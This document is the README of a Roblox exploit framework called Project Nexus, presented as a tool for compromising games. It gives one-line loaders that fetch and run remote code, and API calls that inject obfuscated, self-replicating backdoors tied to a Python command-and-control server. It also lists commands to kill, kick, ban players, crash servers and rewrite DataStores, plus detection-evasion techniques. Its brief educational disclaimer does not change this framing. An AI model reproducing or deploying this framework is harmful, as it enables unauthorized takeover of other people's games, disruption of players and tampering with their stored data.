# Project Nexus v1.0
## Advanced FE Serverside Executor for Roblox

**Project Nexus** is a powerful serverside execution framework designed to compromise Roblox games through backdoor exploitation, RemoteEvent manipulation, and custom injection vectors.

---

## 🚀 Quick Start

### Load in 1 Line:
```lua
loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/loader.lua"))()
```

**Replace `YOUR_USERNAME` with your GitHub username!**

**GUI Toggle:** Press **Right Shift**

---

## 📦 GitHub Setup (30 Seconds)

### Windows:
```bash
cd ProjectNexus
init.bat
# Follow the prompts
```

### Linux/Mac:
```bash
cd ProjectNexus
./init.sh
# Follow the prompts
```

### Manual Setup:
1. Replace `YOUR_USERNAME` in `main.lua` and `loader.lua` with your GitHub username
2. Create new GitHub repo named `ProjectNexus`
3. Push code:
```bash
git init
git add .
git commit -m "Initial commit"
git branch -M main
git remote add origin https://github.com/YOUR_USERNAME/ProjectNexus.git
git push -u origin main
```

**See [SETUP.md](SETUP.md) for detailed instructions.**
**See [LOADSTRINGS.md](LOADSTRINGS.md) for all loadstring variations.**

---

## Features

### Core Capabilities
- **Game Vulnerability Scanner**: Automated detection of backdoors, obfuscated scripts, and exploitable RemoteEvents
- **Multi-Vector Injection**: Creates sophisticated backdoors using obfuscation, attribute storage, and self-replication
- **Serverside Executor**: Full Lua execution with server privileges after successful compromise
- **Remote C&C**: Python-based command and control server for remote operation
- **Client GUI**: User-friendly interface for controlling compromised games

### Advanced Techniques
- **Entropy Analysis**: Detects obfuscated code using Shannon entropy calculations
- **Pattern Matching**: Identifies common backdoor signatures (require(), loadstring, getfenv, etc.)
- **Multi-Layer Obfuscation**: String encoding, control flow flattening, variable randomization
- **Self-Replicating Payloads**: Backdoors that spread through game instances automatically
- **Attribute-Based Hiding**: Evades basic scanners by storing payloads in instance attributes
- **RemoteEvent Exploitation**: Hijacks poorly secured server communication channels

---

## Architecture

```
ProjectNexus/
├── core/
│   ├── scanner.lua          # Vulnerability detection engine
│   ├── injector.lua         # Backdoor creation and deployment
│   ├── executor.lua         # Serverside command execution
│   └── connection.lua       # C&C communication layer
├── server/
│   └── command_server.py    # Python C&C server
├── client/
│   └── gui.lua              # User interface
├── main.lua                 # Main entry point
└── README.md
```

---

## Installation

### Quick Start (GitHub)

**1. Load directly from GitHub:**
```lua
loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/loader.lua"))()
```

**2. Configure your repository:**
- Fork/clone this repo
- Edit `main.lua` and `loader.lua` to update `YOUR_USERNAME`
- Commit and push
- Use your loadstring!

**See [SETUP.md](SETUP.md) for detailed instructions.**

### Full Setup (with C&C Server)

**Prerequisites:**
- Python 3.8+ (for C&C server)
- Roblox executor with HTTP capabilities
- GitHub account

**Steps:**

1. **Upload to GitHub** (see SETUP.md)

2. **Install Python dependencies:**
```bash
pip install -r requirements.txt
```

3. **Start C&C server:**
```bash
cd server
python command_server.py
```
Server listens on `http://0.0.0.0:8080`

4. **Update loader.lua with C&C URL:**
```lua
serverUrl = "http://YOUR_IP:8080",
```

5. **Load in game:**
```lua
loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/loader.lua"))()
```

---

## Usage

### Quick Load (Recommended)

```lua
-- One-line loader
loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/loader.lua"))()

-- GUI loads automatically, press Right Shift to toggle
```

### Basic Initialization

```lua
-- Auto-initialize (recommended for GitHub usage)
getgenv().NexusAutoInit = true
loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/main.lua"))()
-- Access via _G.NexusInstance

-- Manual initialization
local Nexus = loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/main.lua"))()
local instance = Nexus.new({
    commandServer = "http://YOUR_SERVER:8080",
    autoScan = true
})
instance:Initialize()
```

### Scanning for Vulnerabilities

```lua
-- Scan current game
local results = instance:ScanCurrentGame()
print("Rating:", results.rating)
print("Backdoors found:", #results.backdoors)
print("Vulnerable remotes:", #results.remotes)
```

### Compromise Methods

```lua
-- Automatic (tries all methods)
instance:Compromise()

-- Specific methods
instance:Compromise("backdoor")  -- Exploit existing backdoors
instance:Compromise("remote")    -- Exploit RemoteEvents
instance:Compromise("inject")    -- Inject new backdoor
```

### Command Execution

```lua
-- Once compromised, execute commands
instance:Execute([[
    print("Running serverside!")
    game.Workspace.Baseplate.BrickColor = BrickColor.new("Really red")
]])

-- Quick commands
instance:Command("kill", "TargetPlayer")
instance:Command("tp", "Player1", Vector3.new(0, 50, 0))
instance:Command("kick", "Player2", "Kicked by Nexus")
instance:Command("ban", "Player3")
instance:Command("crash", "memory")
instance:Command("admin")  -- Inject admin commands
```

### GUI Interface

```lua
-- Loads automatically with loader.lua
-- Or load manually:
local GUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/client/gui.lua"))()
local gui = GUI.new()
gui:Create()
gui:Toggle()  -- Show/hide
```

---

## Scanner Detection Patterns

The scanner identifies the following vulnerability indicators:

**Backdoor Patterns:**
- `require(%d+)` - External module loading
- `loadstring(game:HttpGet` - Remote code execution
- `getfenv(0)` - Environment manipulation
- `Pose.Value` - Common attribute storage
- `_G[` / `shared[` - Global table access

**Code Analysis:**
- Shannon entropy > 4.5 indicates obfuscation
- Character frequency analysis
- Line-by-line pattern matching

**RemoteEvent Detection:**
- Exposed RemoteEvents in ReplicatedStorage
- RemoteFunctions without validation
- Server event connections without sanity checks

---

## Injector Capabilities

### Backdoor Types

**Basic Backdoor:**
```lua
local backdoor = injector:CreateBasicBackdoor(assetId)
```

**Obfuscated Backdoor:**
```lua
local backdoor = injector:CreateObfuscatedBackdoor("http://c2server.com")
-- Multi-layer obfuscation with junk code injection
```

**Self-Replicating:**
```lua
local backdoor = injector:CreateSelfReplicating("Workspace")
-- Spreads through all descendants automatically
```

**Attribute-Based:**
```lua
local success = injector:CreateAttributeBackdoor(targetInstance)
-- Hides payload in instance attributes
```

**MainModule:**
```lua
local module = injector:CreateMainModule("http://c2server.com")
-- Upload to Roblox as MainModule for require() injection
```

---

## Executor Functions

### Player Manipulation
```lua
executor:KillPlayer("PlayerName")
executor:TeleportPlayer("PlayerName", Vector3.new(0, 50, 0))
executor:GiveItem("PlayerName", 123456)  -- Asset ID
executor:KickPlayer("PlayerName", "Reason")
executor:BanPlayer("PlayerName")
```

### Server Control
```lua
executor:CrashServer("memory")     -- Memory exhaustion
executor:CrashServer("infinite_loop")
executor:CrashServer("recursive")
executor:CrashServer("part_spam")
```

### Admin Injection
```lua
executor:InjectAdminCommands()
-- Injects chat command system (:kill, :tp, :god, :speed, etc.)
```

### Mass Actions
```lua
executor:ExecuteOnAllPlayers([[
    character.Humanoid.WalkSpeed = 100
]])
```

### Data Manipulation
```lua
executor:ModifyDataStore("PlayerData", "Player_12345", {
    coins = 999999,
    level = 100
})
```

---

## C&C Server API

### Endpoints

**Session Management:**
- `POST /connect` - Establish new session
- `POST /disconnect` - End session
- `POST /heartbeat` - Keep session alive
- `GET /sessions` - List all sessions

**Command Queue:**
- `GET /poll` - Get pending commands
- `POST /execute` - Queue command
- `POST /result` - Send execution result

**Command Interface:**
- `POST /cmd/kill` - Kill player
- `POST /cmd/teleport` - Teleport player
- `POST /cmd/crash` - Crash server
- `POST /cmd/admin` - Inject admin
- `POST /cmd/custom` - Custom Lua code

**Example request:**
```bash
curl -X POST http://localhost:8080/cmd/custom \
  -H "Content-Type: application/json" \
  -d '{
    "sessionId": "game_session_id",
    "code": "print(\"Hello from C&C\")"
  }'
```

---

## Security & Evasion

### Obfuscation Layers

1. **String Splitting**: Breaks strings into concatenated parts
2. **Variable Randomization**: Random 8-character variable names
3. **Control Flow Flattening**: Adds junk code and complex logic paths
4. **Base64 Encoding**: Encodes payloads before transmission
5. **Character Code Encoding**: Converts strings to byte sequences

### Detection Evasion

- **Attribute Storage**: Hides code in instance attributes instead of Source
- **Delayed Execution**: Uses `spawn()` and `task.wait()` to avoid immediate detection
- **Remote Loading**: Loads code from external servers to avoid static analysis
- **Self-Modification**: Changes own code at runtime
- **Entropy Randomization**: Adds random operations to lower entropy signature

---

## Example Workflow

### Complete compromise sequence:

```lua
-- 1. Initialize
getgenv().NexusAutoInit = true
loadstring(game:HttpGet("http://YOUR_SERVER/main.lua"))()
local nexus = _G.NexusInstance

-- 2. Scan game
local scan = nexus:ScanCurrentGame()
print("Exploitability:", scan.rating)

-- 3. Compromise
if nexus:Compromise() then
    print("Game compromised!")
    
    -- 4. Execute commands
    nexus:Command("admin")  -- Inject admin system
    nexus:Execute([[
        print("Serverside control established")
    ]])
    
    -- 5. Open GUI for control
    local GUI = loadstring(game:HttpGet("http://YOUR_SERVER/client/gui.lua"))()
    GUI.new():Create():Toggle()
end
```

---

## Technical Notes

### Connection Flow

1. Client establishes session with C&C server
2. Server assigns unique session ID and auth key
3. Backdoor polls for commands every 2 seconds
4. Commands execute serverside with full privileges
5. Results return to C&C server
6. Heartbeat maintains session (5 second interval)

### Execution Context

- Backdoors run in **ServerScriptService** context
- Full access to `game` DataModel
- Can manipulate Players, Workspace, DataStores
- Bypasses FE because execution happens serverside
- RemoteEvents can fire to clients with server authority

### Persistence

- Self-replicating backdoors survive script regeneration
- Attribute-based storage persists through saves
- Multiple injection points ensure redundancy
- Monitors `DescendantAdded` for new infection targets

---

## Known Limitations

1. **HTTP Requirement**: Needs HttpEnabled or executor bypass
2. **Detection Risk**: Active anti-backdoor plugins can detect patterns
3. **Network Dependency**: Requires stable connection to C&C server
4. **Existing Security**: Games with proper sanity checks are harder to exploit
5. **Byfron/Hyperion**: Client-side injection may trigger anti-cheat

---

## Disclaimer

This tool demonstrates serverside exploitation techniques for educational and security research purposes. Use only in games you own or have explicit permission to test. Unauthorized use violates Roblox Terms of Service and may result in account termination or legal action.

---

## Version History

**v1.0** (Current)
- Initial release
- Full scanner, injector, executor implementation
- Python C&C server
- Client GUI interface
- Multi-vector compromise methods

---

## Architecture Diagram

```
┌─────────────────┐
│   Roblox Game   │
│   (Target)      │
└────────┬────────┘
         │
    ┌────▼─────┐
    │ Backdoor │ ◄────── Injected via free models,
    │  Script  │         RemoteEvents, or custom injection
    └────┬─────┘
         │
         │ HTTP Polling (every 2s)
         │
    ┌────▼──────────┐
    │  C&C Server   │ ◄────── Operator Interface
    │  (Python)     │         (Web dashboard / API)
    └───────────────┘
         │
         │ Commands
         │
    ┌────▼─────────┐
    │   Executor   │ ────► Serverside code execution
    │   (Main)     │       Player manipulation
    └──────────────┘       Server control
```

---

## Credits

Built with research from:
- Roblox DevForum security discussions
- Public backdoor analysis repositories
- FE bypass technique documentation
- Serverside exploitation case studies

Project Nexus - Serverside dominance achieved.
